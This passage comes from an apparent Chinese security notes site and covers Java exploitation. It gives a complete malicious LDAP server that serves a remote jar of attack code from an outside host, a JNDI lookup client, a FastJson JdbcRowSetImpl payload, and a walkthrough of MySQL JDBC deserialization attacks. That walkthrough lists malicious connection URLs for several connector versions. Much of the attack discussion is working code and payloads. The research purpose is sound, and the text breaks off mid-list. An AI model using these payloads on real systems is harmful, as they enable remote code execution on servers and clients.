urlInfo,\n\t\t\t\t\t\t\t\t   Name name, Context nameCtx,\n\t\t\t\t\t\t\t\t   Hashtable&lt;?,?&gt; environment)\n\t\tthrows NamingException {\n \n\t// 根据 scheme 查找可用的 ObjectFactory\n\t// e.g. &quot;ftpURLContextFactory&quot;\n\tObjectFactory factory = (ObjectFactory)ResourceManager.getFactory(\n\t\tContext.URL_PKG_PREFIXES, environment, nameCtx,\n\t\t&quot;.&quot; + scheme + &quot;.&quot; + scheme + &quot;URLContextFactory&quot;, defaultPkgPrefix);\n\tif (factory == null)\n\t  return null;\n\t\n\t// Found object factory\n\ttry {\n\t\treturn factory.getObjectInstance(urlInfo, name, nameCtx, environment);\n创建恶意的 LDAP 服务\nLDAP 和 RMI 同理，测试方法也同上。启动 LDAP 服务端程序后我们会在 LDAP 请求中返回一个含有恶意攻击代码的对象工厂的远程 jar 地址，客户端会加载我们构建的恶意对象工厂 (ReferenceObjectFactory) 类然后调用其中的 getObjectInstance 方法从而触发该方法中的恶意代码\nimport com.unboundid.ldap.listener.InMemoryDirectoryServer;\nimport com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;\nimport com.unboundid.ldap.listener.InMemoryListenerConfig;\nimport com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;\nimport com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;\nimport com.unboundid.ldap.sdk.Entry;\nimport com.unboundid.ldap.sdk.LDAPResult;\nimport com.unboundid.ldap.sdk.ResultCode;\n \nimport javax.net.ServerSocketFactory;\nimport javax.net.SocketFactory;\nimport javax.net.ssl.SSLSocketFactory;\nimport java.net.InetAddress;\n \npublic class LDAPReferenceServerTest {\n \n  // 设置LDAP服务端口\n  public static final int SERVER_PORT = 3890;\n \n  // 设置LDAP绑定的服务地址，外网测试换成0.0.0.0\n  public static final String BIND_HOST = &quot;127.0.0.1&quot;;\n \n  // 设置一个实体名称\n  public static final String LDAP_ENTRY_NAME = &quot;test&quot;;\n \n  // 获取LDAP服务地址\n  public static String LDAP_URL = &quot;ldap://&quot; + BIND_HOST + &quot;:&quot; + SERVER_PORT + &quot;/&quot; + LDAP_ENTRY_NAME;\n \n  // 定义一个远程的jar，jar中包含一个恶意攻击的对象的工厂类\n  public static final String REMOTE_REFERENCE_JAR = &quot;p2j.cn/tools/jndi-test.jar&quot;;\n \n  // 设置LDAP基底DN\n  private static final String LDAP_BASE = &quot;dc=javasec,dc=org&quot;;\n \n  public static void main(String[] args) {\n     try {\n        // 创建LDAP配置对象\n        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);\n \n        // 设置LDAP监听配置信息\n        config.setListenerConfigs(new InMemoryListenerConfig(\n              &quot;listen&quot;, InetAddress.getByName(BIND_HOST), SERVER_PORT,\n              ServerSocketFactory.getDefault(), SocketFactory.getDefault(),\n              (SSLSocketFactory) SSLSocketFactory.getDefault())\n        );\n \n        // 添加自定义的LDAP操作拦截器\n        config.addInMemoryOperationInterceptor(new OperationInterceptor());\n \n        // 创建LDAP服务对象\n        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);\n \n        // 启动服务\n        ds.startListening();\n \n        System.out.println(&quot;LDAP服务启动成功,服务地址：&quot; + LDAP_URL);\n     } catch (Exception e) {\n        e.printStackTrace();\n     }\n  }\n \n  private static class OperationInterceptor extends InMemoryOperationInterceptor {\n \n     @Override\n     public void processSearchResult(InMemoryInterceptedSearchResult result) {\n        String base  = result.getRequest().getBaseDN();\n        Entry  entry = new Entry(base);\n \n        try {\n           // 设置对象的工厂类名\n           String className = &quot;com.anbai.sec.jndi.injection.ReferenceObjectFactory&quot;;\n           entry.addAttribute(&quot;javaClassName&quot;, className);\n           entry.addAttribute(&quot;javaFactory&quot;, className);\n \n           // 设置远程的恶意引用对象的jar地址\n           entry.addAttribute(&quot;javaCodeBase&quot;, REMOTE_REFERENCE_JAR);\n \n           // 设置LDAP objectClass\n           entry.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;);\n \n           result.sendSearchEntry(entry);\n           result.setResult(new LDAPResult(0, ResultCode.SUCCESS));\n        } catch (Exception e1) {\n           e1.printStackTrace();\n        }\n     }\n \n  }\n \n}\nLDAP 客户端代码\nimport javax.naming.Context;\nimport javax.naming.InitialContext;\nimport javax.naming.NamingException;\n \nimport static com.anbai.sec.jndi.injection.LDAPReferenceServerTest.LDAP_URL;\n \npublic class LDAPReferenceClientTest {\n \n  public static void main(String[] args) {\n     try {\n//       // 测试时如果需要允许调用RMI远程引用对象加载请取消如下注释\n//       System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;, &quot;true&quot;);\n \n        Context ctx = new InitialContext();\n \n        // 获取RMI绑定的恶意ReferenceWrapper对象\n        Object obj = ctx.lookup(LDAP_URL);\n \n        System.out.println(obj);\n     } catch (NamingException e) {\n        e.printStackTrace();\n     }\n  }\n \n}\nA-Journey-From-JNDI-LDAP-Manipulation-To-RCE 中提到了包括 RMI、LDAP、CORBA 的 JNDI 注入被广泛的利用于近年来的各种 JNDI 注入漏洞。\n触发 JNDI 注入漏洞的方式只需要直接或间接的调用 JNDI 服务，且 lookup 的参数值可控、JDK 版本、服务器网络环境满足漏洞利用条件就可以成功的利用该漏洞。\nFastJson 反序列化 JNDI 注入示例\n比较典型的漏洞有 FastJson 的 JNDI 注入漏洞，FastJson 在反序列化 JSON 对象时候会通过反射自动创建类实例且 FastJson 会根据传入的 JSON 字段间接的调用类成员变量的 setXXX 方法。FastJson 这个反序列化功能看似无法实现 RCE，但是有人找出多个符合 JNDI 注入漏洞利用条件的 Java 类 (如：com.sun.rowset.JdbcRowSetImpl) 从而实现了 RCE：\n{\n    &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,\n    &quot;dataSourceName&quot;: &quot;ldap://127.0.0.1:3890/test&quot;,\n    &quot;autoCommit&quot;: &quot;true&quot;\n}\n总结\nJNDI 利用方式：\n\n恶意 ObjectFactory#getObjectInstance 方法『恶意工厂类不是必须实现 javax.naming.spi.ObjectFactory 接口，将待执行的代码放在 static 代码块中也是可以的』\n\nLDAP\n\nReferences Entry\n\n使用 javaClassName、javaFactory、javaCodebase 属性\n\n\n\n\nRMI\n\n使用 javax.naming.Reference 创建 Reference 对象，并通过 com.sun.jndi.rmi.registry.ReferenceWrapper 进行封装。\n\n\n\n\n反序列化\n\nLDAP\n\njavaSerializedObject 的 javaSerializedData 属性\njavaMarshalledObject 的 javaSerializedData 属性\njavaNamingReference 的 javaReferenceAddress 属性\n\n\n\n\nRemote Location\n\njavaRemoteLocation 属性，进行 JNDI 注入『变成二次注入』\n\n\n\n参考\n\ndocs.oracle.com/javase/jndi/tutorial/getStarted/overview/index.html 『JNDI Overview』\ndocs.oracle.com/javase/8/docs/technotes/guides/jndi/jndi-ldap.html 『LDAP Naming Service Provider for The JNDI』\npaper.seebug.org/942 『如何绕过高版本 JDK 的限制进行 JNDI 注入利用』\nwww.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf 『A Journey From JNDI LDAP Manipulation To RCE』\nbugs.openjdk.org/browse/JDK-6260095 『javaRemoteLocation attributes deprecated but not removed』\n"},"articles/security/java/jdbc/JDBC-Connection-URL-Attack":{"title":"JDBC Connection URL Attack","links":["cheat-sheets/Following-List","articles/security/mysql/MySQL-Local-File-Read-Arbitrary-File-Read-Vulnerability","articles/security/java/jdbc/Part-I-New-Exploit-Technique-In-Java-Deserialization-Attack","articles/security/java/jdbc/Part-II-Make-JDBC-Attacks-Brilliant-Again"],"tags":["jdbc"],"content":"\n在 JDBC URL 可控的情况下，进行利用\n\nTimeLine\n最开始在 BlackHat Europe 2019 上由 Back2Zero 团队提出，\n\n PPT：i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf\n 视频：New Exploit Technique In Java Deserialization Attack - YouTube\n\n后在 HITB SECCONF Singapore-2021 上由 Litch1 &amp; pyn3rd 进行了拓展和延伸。\n\n PPT： conference.hitb.org/hitbsecconf2021sin/materials/D1T2 - Make JDBC Attacks Brilliant Again - Xu Yuanzhen &amp; Chen Hongkun.pdf\n\n在 BlackHat Asis 2023 上 pyn3rd 再次分享了该攻击技术的新成果。\n\n PPT：BLACKHAT_Asia2023/AS-23-Yuanzhen-A-new-attack-interface-in-Java.pdf at main · Mr-xn/BLACKHAT_Asia2023 · GitHub\n\nJDBC MySQL Connector 下的任意文件读取，见 MySQL Local File Read Arbitrary File Read Vulnerability。\n文章分了 3 个部分：\n\nPart-I New Exploit Technique In Java Deserialization Attack：以 MySQL 数据库为目标，分析 MySQL JDBC Connector 的利用方式，包含 5.x 和 8.x 版本的分析。\nPart-II Make JDBC Attacks Brilliant Again\n\n参考\n\nMake JDBC Attacks Brilliant Again I\nJDBC Connection URL Attack | 素十八\nGitHub - su18/JDBC-Attack: JDBC Connection URL Attack\nMySQL JDBC 客户端反序列化漏洞分析 - fnmsd\n"},"articles/security/java/jdbc/JDBC-RoadMap":{"title":"JDBC RoadMap","links":[],"tags":["jdbc"],"content":"所有版本 1.0、1.2、2.0、2.1、3.0、4.0、4.1、4.2。\n\n(Note that the JDBC 2.1 core API and the JDBC 2.0 Optional Package API together are referred to as the JDBC 2.0 API.)\n\nJDBC 3.0\n\nJSR 54 引入，JDK 1.4 实现\n\nJDBC 4.0\n\nJSR 221 引入，JDK 6 实现，参考 Features supported on all JDBC 4 releases\n\nJDBC 4.1\n\nMaintenance Release 1 of JSR 221 引入， JDK 7 实现，参考 JDBC 4.1\n\n新增 features：\n\nThe ability to use a try-with-resources statement to automatically close resources of type Connection, ResultSet, and Statement\nRowSet 1.1: The introduction of the RowSetFactory interface and the RowSetProvider class, which enable you to create all types of row sets supported by your JDBC driver.\n\nJDBC 4.2\n\nMaintenance Release 2 of JSR 221 引入，JDK 8 实现，参考 JDBC 4.2\n\n新增 features：\n\nAddition of REF_CURSOR support.\nAddition of java.sql.DriverAction Interface\nAddition of the java.sql.SQLType Interface\nAddition of the java.sql.JDBCType Enum\nAdd Support for large update counts\nChanges to the existing interfaces\nRowset 1.2: Lists the enhancements for JDBC RowSet.\nJDBC-ODBC bridge has been removed\n\nJDBC 4.3\n\nMaintenance Release 3 of JSR 221 引入，JDK 9 实现，参考 JDBC 4.3\n"},"articles/security/java/jdbc/Part-I-New-Exploit-Technique-In-Java-Deserialization-Attack":{"title":"Part-I New Exploit Technique In Java Deserialization Attack","links":["articles/security/java/gadget/CommonsCollections5"],"tags":["jdbc"],"content":"BlackHat Europe 2019 上由 Back2Zero 团队提出，\n\n PPT：i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf\n 视频：New Exploit Technique In Java Deserialization Attack - YouTube\n\n8.x 版本分析\n分析环境\n\nmysql-connector-java:8.0.11\n\n如果 JDBC 的 URL 可控，可通过如下 URL 配合伪造的 MySQL 服务器，返回恶意数据进行反序列化漏洞的利用。\nString DB_URL = &quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc&quot;;\n其中利用了两个参数：\n\nqueryInterceptors 参数是一个查询拦截器，可以定义多个类『由逗号分隔』组成 pipeline，在查询的前后进行拦截从而改变结果或进行统计等自定义操作。\nautoDeserialize 参数表示是否自动识别并反序列化存放中 BLOB 字段的数据。\n\n拦截器需要实现 com.mysql.cj.interceptors.QueryInterceptor 接口，内部共有 5 个。\n\ncom.mysql.cj.interceptors.NoSubInterceptorWrapper\ncom.mysql.cj.jdbc.ha.LoadBalancedAutoCommitInterceptor\ncom.mysql.cj.jdbc.interceptors.ResultSetScannerInterceptor\ncom.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\ncom.mysql.cj.jdbc.interceptors.SessionAssociationInterceptor\n\nBack2Zero 的分享中，借助的是 ServerStatusDiffInterceptor，在 preProcess/postProcess 方法中都会调用 populateMapWithSessionStatusValues 方法 [1] &amp; [2]\npublic &lt;T extends Resultset&gt; T preProcess(Supplier&lt;String&gt; sql, Query interceptedQuery) {\n\tpopulateMapWithSessionStatusValues(this.preExecuteValues); // [1]\n \n\treturn null; // we don&#039;t actually modify a result set\n}\n@Override\npublic &lt;T extends Resultset&gt; T postProcess(Supplier&lt;String&gt; sql, Query interceptedQuery, T originalResultSet, ServerSession serverSession) {\n\tpopulateMapWithSessionStatusValues(this.postExecuteValues); // [2]\n \n\tthis.log.logInfo(&quot;Server status change for query:\\n&quot; + Util.calculateDifferences(this.preExecuteValues, this.postExecuteValues));\n \n\treturn null; // we don&#039;t actually modify a result set\n \n}\npopulateMapWithSessionStatusValues 方法中进一步调用 ResultSetUtil#resultSetToMap [3]\nprivate void populateMapWithSessionStatusValues(Map&lt;String, String&gt; toPopulate) {\n\tjava.sql.Statement stmt = null;\n\tjava.sql.ResultSet rs = null;\n \n\ttry {\n\t\ttry {\n\t\t\ttoPopulate.clear();\n \n\t\t\tstmt = this.connection.createStatement();\n\t\t\trs = stmt.executeQuery(&quot;SHOW SESSION STATUS&quot;);\n\t\t\tResultSetUtil.resultSetToMap(toPopulate, rs); // [3]\n\t// ...\n}\n而 resultSetToMap 中会调用 getObject 方法，\npublic static void resultSetToMap(Map mappedValues, ResultSet rs) throws SQLException {\n\twhile (rs.next()) {\n\t\tmappedValues.put(rs.getObject(1), rs.getObject(2));\n\t}\n}\nResultSetImpl\n在这里为 com.mysql.cj.jdbc.result.ResultSetImpl#getObject 方法，如果返回的查询结果中类型为 BIT [4]，或 BLOB [5]，并且设置了 autoDeserialize 为 true [6]，那么会对返回的数据进行反序列化 [7]。\npublic Object getObject(int columnIndex) throws SQLException {\n\tcheckRowPos();\n\tcheckColumnBounds(columnIndex);\n \n\tint columnIndexMinusOne = columnIndex - 1;\n \n\t// we can&#039;t completely rely on code below because primitives have default values for null (e.g. int-&gt;0)\n\tif (this.thisRow.getNull(columnIndexMinusOne)) {\n\t\treturn null;\n\t}\n \n\tField field = this.columnDefinition.getFields()[columnIndexMinusOne];\n\tswitch (field.getMysqlType()) {\n\t\tcase BIT: // [4]\n\t\t\t// TODO Field sets binary and blob flags if the length of BIT field is &gt; 1; is it needed at all?\n\t\t\tif (field.isBinary() || field.isBlob()) { // [5]\n\t\t\t\tbyte[] data = getBytes(columnIndex);\n \n\t\t\t\tif (this.connection.getPropertySet().getBooleanReadableProperty(PropertyDefinitions.PNAME_autoDeserialize).getValue()) { // [6]\n\t\t\t\t\tObject obj = data;\n \n\t\t\t\t\tif ((data != null) &amp;&amp; (data.length &gt;= 2)) {\n\t\t\t\t\t\tif ((data[0] == -84) &amp;&amp; (data[1] == -19)) {\n\t\t\t\t\t\t\t// Serialized object?\n\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\tByteArrayInputStream bytesIn = new ByteArrayInputStream(data);\n\t\t\t\t\t\t\t\tObjectInputStream objIn = new ObjectInputStream(bytesIn);\n\t\t\t\t\t\t\t\tobj = objIn.readObject(); // [7]\n\t\t\t\t\t\t\t\tobjIn.close();\n\t\t\t\t\t\t\t\tbytesIn.close();\n\t\t\t\t\t\t\t} catch (ClassNotFoundException cnfe) {\n\t\t\t\t\t\t\t\tthrow SQLError.createSQLException(Messages.getString(&quot;ResultSet.Class_not_found___91&quot;) + cnfe.toString()\n\t\t\t\t\t\t\t\t\t\t+ Messages.getString(&quot;ResultSet._while_reading_serialized_object_92&quot;), getExceptionInterceptor());\n\t\t\t\t\t\t\t} catch (IOException ex) {\n\t\t\t\t\t\t\t\tobj = data; // not serialized?\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\treturn getString(columnIndex);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n \n\t\t\t\t\treturn obj;\n\t\t\t\t}\n \n\t\t\t\treturn data;\n\t\t\t}\n \n\t\t\treturn field.isSingleBit() ? Boolean.valueOf(getBoolean(columnIndex)) : getBytes(columnIndex);\nServerStatusDiffInterceptor\n想要触发拦截器，要满足两个条件：\n\n为当前会话设置 queryInterceptors\n发起查询 “\n\nqueryInterceptors 的设置位于 ConnectionImpl#connectOneTryOnly，在连接建立后进行设置。\nprivate void connectOneTryOnly(boolean isForReconnect) throws SQLException {\n\tException connectionNotEstablishedBecause = null;\n \n\ttry {\n \n\t\tJdbcConnection c = getProxy();\n\t\tthis.session.connect(this.origHostInfo, this.user, this.password, this.database, DriverManager.getLoginTimeout() * 1000, c);\n \n\t\t// save state from old connection\n\t\tboolean oldAutoCommit = getAutoCommit();\n\t\tint oldIsolationLevel = this.isolationLevel;\n\t\tboolean oldReadOnly = isReadOnly(false);\n\t\tString oldCatalog = getCatalog();\n \n\t\tthis.session.setQueryInterceptors(this.queryInterceptors);\nServerStatusDiffInterceptor 虽然是拦截器，但是需要发起查询，才会触发 preProcess/postProcess 方法。而在 8.x 的 MySQL Connector 中，Connector 成功建立连接后『完成认证』，会有一些默认执行的查询语句。\nSELECT @@session.auto_increment_increment AS auto_increment_increment, @@character_set_client AS character_set_client, @@character_set_connection AS character_set_connection, @@character_set_results AS character_set_results, @@character_set_server AS character_set_server, @@collation_server AS collation_server, @@collation_connection AS collation_connection, @@init_connect AS init_connect, @@interactive_timeout AS interactive_timeout, @@license AS license, @@lower_case_table_names AS lower_case_table_names, @@max_allowed_packet AS max_allowed_packet, @@net_write_timeout AS net_write_timeout, @@performance_schema AS performance_schema, @@sql_mode AS sql_mode, @@system_time_zone AS system_time_zone, @@time_zone AS time_zone, @@transaction_isolation AS transaction_isolation, @@wait_timeout AS wait_timeout // [13]\n \nSET character_set_results = NULL\n \nSET autocommit=1\n如下图\n\n如何触发\n不过其中只有 SET autocommit=1 会触发 QueryInterceptor ，原因是，SET autocommit=1 是通过 execSQL 方法执行的 [8]。\n// ConnectionImpl#setAutoCommit\npublic void setAutoCommit(final boolean autoCommitFlag) throws SQLException {\n    // ...\n        // this internal value must be set first as failover depends on it being set to true to fail over (which is done by most app servers and\n        // connection pools at the end of a transaction), and the driver issues an implicit set based on this value when it (re)-connects to a\n        // server so the value holds across connections\n        this.session.getServerSession().setAutoCommit(autoCommitFlag);\n \n        if (needsSetOnServer) {\n            this.session.execSQL(null, autoCommitFlag ? &quot;SET autocommit=1&quot; : &quot;SET autocommit=0&quot;, -1, null, false, this.nullStatementResultSetFactory,\n                    this.database, null, false); // [8]\n该方法会进一步调用至 sendQueryPacket，其中会调用 invokeQueryInterceptorsPre 执行 Interceptor [9]，\npublic final &lt;T extends Resultset&gt; T sendQueryPacket(Query callingQuery, NativePacketPayload queryPacket, int maxRows, boolean streamResults,\n\t\tString catalog, ColumnDefinition cachedMetadata, GetProfilerEventHandlerInstanceFunction getProfilerEventHandlerInstanceFunction,\n\t\tProtocolEntityFactory&lt;T, NativePacketPayload&gt; resultSetFactory) throws IOException {\n\tthis.statementExecutionDepth++;\n \n\tbyte[] queryBuf = null;\n\tint oldPacketPosition = 0;\n\tlong queryStartTime = 0;\n\tlong queryEndTime = 0;\n \n\tqueryBuf = queryPacket.getByteBuffer();\n\toldPacketPosition = queryPacket.getPosition(); // save the packet position\n \n\tqueryStartTime = getCurrentTimeNanosOrMillis();\n\tLazyString query = new LazyString(queryBuf, 1, (oldPacketPosition - 1));\n \n\ttry {\n\t\tif (this.queryInterceptors != null) {\n\t\t\tT interceptedResults = invokeQueryInterceptorsPre(query, callingQuery, false); // [9]\n \n需要注意的是，invokeQueryInterceptorsPre 有两个重载方法，[9] 最终会调用 preProcess『它也有两个重载』\n&lt;T extends Resultset&gt; T preProcess(Supplier&lt;String&gt; sql, Query interceptedQuery);\n而前两个查询，则是直接通过 NativeSession#sendCommand **[10] &amp; [11] **\n\n以下两个方法都位于 NativeSession\n\npublic void setSessionVariables() {\n\tString sessionVariables = getPropertySet().getStringReadableProperty(PropertyDefinitions.PNAME_sessionVariables).getValue();\n\tif (sessionVariables != null) {\n\t\tList&lt;String&gt; variablesToSet = new ArrayList&lt;&gt;();\n\t\tfor (String part : StringUtils.split(sessionVariables, &quot;,&quot;, &quot;\\&quot;&#039;(&quot;, &quot;\\&quot;&#039;)&quot;, &quot;\\&quot;&#039;&quot;, true)) {\n\t\t\tvariablesToSet.addAll(StringUtils.split(part, &quot;;&quot;, &quot;\\&quot;&#039;(&quot;, &quot;\\&quot;&#039;)&quot;, &quot;\\&quot;&#039;&quot;, true));\n\t\t}\n \n\t\tif (!variablesToSet.isEmpty()) {\n\t\t\tStringBuilder query = new StringBuilder(&quot;SET &quot;);\n\t\t\tString separator = &quot;&quot;;\n\t\t\tfor (String variableToSet : variablesToSet) {\n\t\t\t\tif (variableToSet.length() &gt; 0) {\n\t\t\t\t\tquery.append(separator);\n\t\t\t\t\tif (!variableToSet.startsWith(&quot;@&quot;)) {\n\t\t\t\t\t\tquery.append(&quot;SESSION &quot;);\n\t\t\t\t\t}\n\t\t\t\t\tquery.append(variableToSet);\n\t\t\t\t\tseparator = &quot;,&quot;;\n\t\t\t\t}\n\t\t\t}\n\t\t\tsendCommand(this.commandBuilder.buildComQuery(null, query.toString()), false, 0); // [10]\n\t\t}\n\t}\n}\n \npublic boolean configureClientCharacterSet(boolean dontCheckServerMatch) {\n\t// ...\n    try {\n        characterSetAlreadyConfigured = true;\n \n        configureCharsetProperties();\n        realJavaEncoding = this.characterEncoding.getValue(); // we need to do this again to grab this for versions &gt; 4.1.0\n \n\t\t// ...\n \n        if (realJavaEncoding != null) {\n            // Now, inform the server what character set we will be using from now-on...\n            if (realJavaEncoding.equalsIgnoreCase(&quot;UTF-8&quot;) || realJavaEncoding.equalsIgnoreCase(&quot;UTF8&quot;)) {\n                // charset names are case-sensitive\n \n                boolean useutf8mb4 = CharsetMapping.UTF8MB4_INDEXES.contains(this.protocol.getServerSession().getServerDefaultCollationIndex());\n \n                if (!this.useOldUTF8Behavior.getValue()) {\n                    if (dontCheckServerMatch || !this.protocol.getServerSession().characterSetNamesMatches(&quot;utf8&quot;)\n                            || (!this.protocol.getServerSession().characterSetNamesMatches(&quot;utf8mb4&quot;))) {\n \n                        sendCommand(this.commandBuilder.buildComQuery(null, &quot;SET NAMES &quot; + (useutf8mb4 ? &quot;utf8mb4&quot; : &quot;utf8&quot;)), false, 0); // [11]\nNativeProtocol#sendCommand 方法也会调用 invokeQueryInterceptorsPre，但注意它只有两个参数 [12]\n@Override\npublic final NativePacketPayload sendCommand(Message queryPacket, boolean skipCheck, int timeoutMillis) {\n\tint command = queryPacket.getByteBuffer()[0];\n\tthis.commandCount++;\n \n\tif (this.queryInterceptors != null) {\n\t\tNativePacketPayload interceptedPacketPayload = (NativePacketPayload) invokeQueryInterceptorsPre(queryPacket, false); // [12]\n\t// ...\n而该 invokeQueryInterceptorsPre 内部最后调用的是另一个 preProcess，ServerStatusDiffInterceptor 并没有实现它。\ndefault &lt;M extends Message&gt; M preProcess(M queryPacket) {\n\treturn null;\n}\n伪造服务端\n复现该漏洞利用方式，需要伪造一个 MySQL 服务返回恶意的 BLOB 类型数据，根据 [4] &amp; [5] 处的判断条件，数据的类型需要为 MYSQL_TYPE_BIT，标志需要为 BLOB 或 BINARY。\n\n这里在写服务端代码的时候，Handshake 后返回 [13] 查询结果时没有正确设置表名，列名，导致虽然返回结果，但是 Connector 无法读取到 Timezone，从而在 ResultSetImpl 的构造方法中 [14] 引发了 NullPointerException。\n\npublic ResultSetImpl(ResultsetRows tuples, JdbcConnection conn, StatementImpl creatorStmt) throws SQLException {\n\t// ...\n\t// this.session.getServerSession().getDefaultTimeZone() is null\n\tthis.defaultTimeValueFactory = new SqlTimeValueFactory(pset, null, this.session.getServerSession().getDefaultTimeZone(), this); // [14]\n下面使用 CommonsCollections5 进行利用，客户端代码如下：\npublic void serialTest() throws ClassNotFoundException, SQLException {\n\tString driver = &quot;com.mysql.cj.jdbc.Driver&quot;;\n\tString DB_URL =\n\t\t\t&quot;jdbc:mysql://127.0.0.1:&quot;\n\t\t\t\t\t+ port\n\t\t\t\t\t+ &quot;/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;;\n\tClass.forName(driver);\n\tConnection conn = DriverManager.getConnection(DB_URL, server.getUser(), server.getPassword());\n}\n启动恶意服务后，运行客户端，成功执行命令。\n\n5.x 版本分析\n分析环境\n\nmysql-connector-java:5.1.19\n\n此版本没有 queryInterceptors 参数，但是可以确定的是，漏洞的触发点是 Util.resultSetToMap。所以需要找到一个 Source 让数据流能够到达这里，在 5.x 中有另一个参数\ndetectCustomCollations\n\ndetectCustomCollations：此参数表示 Connector 是否要查找位于服务器上的 charsets/collations，从 5.1.29 版本开始，默认为 false\n\n而此参数对应的调用逻辑位于 com.mysql.jdbc.ConnectionImpl#buildCollationMapping\nprivate void buildCollationMapping() throws SQLException {\n\tHashMap&lt;Integer, String&gt; javaCharset = null;\n\tif (this.versionMeetsMinimum(4, 1, 0)) {\n\t\t// ...\n\t\ttry {\n\t\t\tif (sortedCollationMap == null) {\n\t\t\t\t// ...\n\t\t\t\tresults = stmt.executeQuery(&quot;SHOW COLLATION&quot;);\n\t\t\t\tUtil.resultSetToMap(sortedCollationMap, results, 3, 2); // [15]\n在 [15] 中调用 Util.resultSetToMap 处理 SHOW COLLATION 的查询结果。\n\n此利用方式由 chybeta 发现。\n\n注意其中的利用条件，服务器版本大于 4.1.0，并且需要设置 autoDeserialize=true。detectCustomCollations 参数 在 5.1.19 - 5.1.28 版本中默认为 true。下面进行利用。\n伪造服务端\n\n测试版本 MySQL JDBC Connector 5.1.28\n\n在执行 SHOW COLLATION 前依次执行了以下语句，\n/* mysql-connector-java-5.1.19 ( Revision: tonci.grgin@oracle.com-20111003110438-qfydx066wsbydkbw ) */SHOW VARIABLES WHERE Variable_name =&#039;language&#039; OR Variable_name = &#039;net_write_timeout&#039; OR Variable_name = &#039;interactive_timeout&#039; OR Variable_name = &#039;wait_timeout&#039; OR Variable_name = &#039;character_set_client&#039; OR Variable_name = &#039;character_set_connection&#039; OR Variable_name = &#039;character_set&#039; OR Variable_name = &#039;character_set_server&#039; OR Variable_name = &#039;tx_isolation&#039; OR Variable_name = &#039;transaction_isolation&#039; OR Variable_name = &#039;character_set_results&#039; OR Variable_name = &#039;timezone&#039; OR Variable_name = &#039;time_zone&#039; OR Variable_name = &#039;system_time_zone&#039; OR Variable_name = &#039;lower_case_table_names&#039; OR Variable_name = &#039;max_allowed_packet&#039; OR Variable_name = &#039;net_buffer_length&#039; OR Variable_name = &#039;sql_mode&#039; OR Variable_name = &#039;query_cache_type&#039; OR Variable_name = &#039;query_cache_size&#039; OR Variable_name = &#039;init_connect&#039;\n \n/* mysql-connector-java-5.1.19 ( Revision: tonci.grgin@oracle.com-20111003110438-qfydx066wsbydkbw ) */SELECT @@session.auto_increment_increment\n对于第一个查询，伪造服务器时，返回一个 RowSet 为空的的响应包即可。对于第二个请求，需要返回符合格式要求的数据，返回数字 1 即可。\n\n伪造响应时需要注意内容符合 ResultSetImpl#getObject 方法的要求\n\n[16]：传入的 columnIndex = 3，返回的数据中，列定义数量不能少于 3\n[17]：第 3 列的类型需要为 MYSQL_TYPE_BIT\n[18]：第 3 列标志位需要为 BIN 或者 BLOB\n\npublic Object getObject(int columnIndex) throws SQLException {\n\tthis.checkRowPos();\n\tthis.checkColumnBounds(columnIndex); // [16]\n\tint columnIndexMinusOne = columnIndex - 1;\n\tif (this.thisRow.isNull(columnIndexMinusOne)) {\n\t\tthis.wasNullFlag = true;\n\t\treturn null;\n\t} else {\n\t\tthis.wasNullFlag = false;\n\t\tField field = this.fields[columnIndexMinusOne];\n\t\tString stringVal;\n\t\tswitch (field.getSQLType()) {\n\t\t\t// ...\n\t\t\tcase -2: // [17]\n\t\t\t\tif (field.getMysqlType() == 255) {\n\t\t\t\t\treturn this.getBytes(columnIndex);\n\t\t\t\t} else if (!field.isBinary() &amp;&amp; !field.isBlob()) {\n\t\t\t\t\treturn this.getBytes(columnIndex);\n\t\t\t\t} else { // [18]\n\t\t\t\t\tbyte[] data = this.getBytes(columnIndex);\n\t\t\t\t\tif (!this.connection.getAutoDeserialize()) {\n\t\t\t\t\t\treturn data;\n\t\t\t\t\t} else {\n\t\t\t\t\t// ...\n客户端代码如下\npublic void serialTest5128() throws ClassNotFoundException, SQLException {\n\tString driver = &quot;com.mysql.jdbc.Driver&quot;;\n\tString DB_URL = &quot;jdbc:mysql://127.0.0.1:&quot; + port + &quot;/test?autoDeserialize=true&quot;;\n\tClass.forName(driver);\n\tConnection conn =\n\t\t\tDriverManager.getConnection(DB_URL, server.getUser(), server.getPassword());\n}\n发送请求后成功执行命令\n\n利用方式总结\nfnmsd 总结的各个版本可用的 URL\nServerStatusDiffInterceptor 触发：\n8.x\njdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\n6.x\n属性名不同，变更为 statementInterceptors\njdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\n5.1.11 - 5.x\njdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\n\n5.1.10 及以下的 5.1.X 版本：同上，但是需要连接后执行查询。\n\n5.0.x\n没有 ServerStatusDiffInterceptor，不可利用。\ndetectCustomCollations 触发：\n5.1.41 - 5.1.x\n不可用\n5.1.29 - 